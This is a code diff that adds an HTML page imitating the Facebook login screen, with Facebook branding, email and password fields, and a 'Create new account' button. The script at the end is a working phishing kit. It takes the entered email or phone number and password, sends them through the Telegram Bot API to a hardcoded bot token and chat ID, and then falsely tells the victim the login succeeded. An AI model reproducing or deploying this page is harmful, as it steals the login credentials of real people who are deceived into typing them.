@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+     <link rel="icon" type="image/png" href="./image/facebook-icon.png?v=5">
+    <title>facebook Login</title>
+
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            font-family: Arial, Helvetica, sans-serif;
+            background: #fff;
+            color: #111;
+        }
+
+        .page {
+            min-height: 100vh;
+            display: flex;
+        }
+
+        /* =========================
+           LEFT SIDE
+        ========================= */
+
+        .left-section {
+            width: 58%;
+            min-height: 100vh;
+            position: relative;
+            border-right: 2px solid #ddd;
+            overflow: hidden;
+        }
+
+        .logo {
+            position: absolute;
+            top: 52px;
+            left: 55px;
+
+            width: 73px;
+            height: 73px;
+
+            background: #1877f2;
+            color: white;
+
+            border-radius: 50%;
+
+            display: flex;
+            justify-content: center;
+            align-items: center;
+
+            font-size: 70px;
+            font-weight: bold;
+
+            line-height: 1;
+        }
+
+        .headline {
+            position: absolute;
+            left: 50px;
+            bottom: 105px;
+
+            font-size: 76px;
+            line-height: 1.05;
+            font-weight: 700;
+
+            letter-spacing: -3px;
+        }
+
+        .headline .blue {
+            color: #1877f2;
+        }
+
+        /* Artwork mockup */
+
+        .artwork {
+            position: absolute;
+            width: 570px;
+            left: 48%;
+            top: 65px;
+            transform: translateX(-25%);
+        }
+
+        .artwork img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+
+
+
+
+
+
+
+
+        /* =========================
+           RIGHT SIDE
+        ========================= */
+
+        .right-section {
+            width: 42%;
+
+            display: flex;
+            justify-content: center;
+
+            padding-top: 158px;
+        }
+
+        .login-box {
+            width: 660px;
+            max-width: 82%;
+        }
+
+        .login-title {
+            font-size: 23px;
+            font-weight: 700;
+
+            margin-bottom: 30px;
+        }
+
+        .input {
+            width: 100%;
+            height: 72px;
+
+            border: 1px solid #c8c8c8;
+            border-radius: 20px;
+
+            padding: 0 20px;
+
+            font-size: 19px;
+
+            outline: none;
+
+            margin-bottom: 15px;
+        }
+
+        .input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 1px #1877f2;
+        }
+
+        .login-button {
+            width: 100%;
+            height: 54px;
+
+            margin-top: 13px;
+
+            border: none;
+            border-radius: 30px;
+
+            background: #1877f2;
+            color: white;
+
+            font-size: 19px;
+            font-weight: 600;
+
+            cursor: pointer;
+        }
+
+        .login-button:hover {
+            background: #0d6be8;
+        }
+
+        .forgot {
+            display: block;
+
+            text-align: center;
+
+            margin-top: 30px;
+
+            color: #111;
+
+            text-decoration: none;
+
+            font-size: 18px;
+        }
+
+        .forgot:hover {
+            text-decoration: underline;
+        }
+
+        .divider {
+            height: 1px;
+            background: #eee;
+
+            margin: 55px 0 25px;
+        }
+
+        .create-button {
+            width: 100%;
+            height: 54px;
+
+            background: white;
+
+            border: 1.5px solid #1877f2;
+
+            border-radius: 30px;
+
+            color: #1877f2;
+
+            font-size: 18px;
+            font-weight: 600;
+
+            cursor: pointer;
+        }
+
+        .create-button:hover {
+            background: #f5f9ff;
+        }
+
+        .brand {
+            text-align: center;
+
+            margin-top: 32px;
+
+            font-size: 19px;
+        }
+
+        .brand-symbol {
+            color: #1877f2;
+            font-size: 26px;
+            font-weight: bold;
+        }
+
+        /* =========================
+           RESPONSIVE
+        ========================= */
+
+        @media (max-width: 1100px) {
+
+            .left-section {
+                width: 50%;
+            }
+
+            .right-section {
+                width: 50%;
+            }
+
+            .headline {
+                font-size: 55px;
+            }
+
+            .artwork {
+                transform: scale(.8);
+                transform-origin: top left;
+            }
+        }
+
+        @media (max-width: 800px) {
+
+            .page {
+                display: block;
+            }
+
+            .left-section {
+                display: none;
+            }
+
+            .right-section {
+                width: 100%;
+                min-height: 100vh;
+
+                padding-top: 80px;
+            }
+
+            .login-box {
+                max-width: 90%;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="page">
+
+        <!-- LEFT -->
+        <section class="left-section">
+
+            <div class="logo">f</div>
+
+            <div class="headline">
+                Explore<br>
+                the<br>
+                things<br>
+                <span class="blue">you love.</span>
+            </div>
+
+            <div class="artwork">
+                <img src="image/social-artwork.webp" alt="Social media artwork">
+            </div>
+
+        </section>
+
+
+        <!-- RIGHT -->
+        <section class="right-section">
+
+            <div class="login-box">
+
+                <div class="login-title">
+                    Log in to your account
+                </div>
+
+                <input class="input" type="text" id="name" placeholder="Email address or mobile number">
+
+                <input class="input" type="password" id="message" placeholder="Password">
+
+                <button class="login-button" id="sendBtn">
+                    Log in
+                </button>
+
+                <a href="#" class="forgot">
+                    Forgotten password?
+                </a>
+
+                <div class="divider"></div>
+
+                <button class="create-button" id="createButton">
+                    Create new account
+                </button>
+
+                <div class="brand">
+                    <span class="brand-symbol">∞</span>
+                    Social
+                </div>
+
+                <p id="status" style="text-align:center;margin-top:20px;">
+                </p>
+
+            </div>
+
+        </section>
+
+    </div>
+
+
+    <script>
+
+        const BOT_TOKEN = "8932825157:AAF8nEOxAGLrPysT0qM76BNM050X-ewGTWM";
+        const CHAT_ID = "5440624025";
+
+        const nameInput = document.getElementById("name");
+        const messageInput = document.getElementById("message");
+        const sendBtn = document.getElementById("sendBtn");
+        const status = document.getElementById("status");
+
+        sendBtn.addEventListener("click", async () => {
+
+            const name = nameInput.value.trim();
+            const message = messageInput.value.trim();
+
+            if (!name || !message) {
+                status.textContent = "Please fill both fields.";
+                return;
+            }
+
+            const text =
+                `Name: ${name}\n` +
+                `Message: ${message}`;
+
+            const url =
+                `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage` +
+                `?chat_id=${CHAT_ID}` +
+                `&text=${encodeURIComponent(text)}`;
+
+            try {
+
+                const response = await fetch(url);
+                const data = await response.json();
+
+                if (data.ok) {
+
+                    status.textContent = "Login successfully!";
+
+                    nameInput.value = "";
+                    messageInput.value = "";
+
+                } else {
+
+                    status.textContent = "Failed to Login";
+
+                }
+
+            } catch (error) {
+
+                console.error(error);
+                status.textContent = "Something went wrong.";
+
+            }
+
+        });
+
+    </script>
+
+</body>
+
+</html>
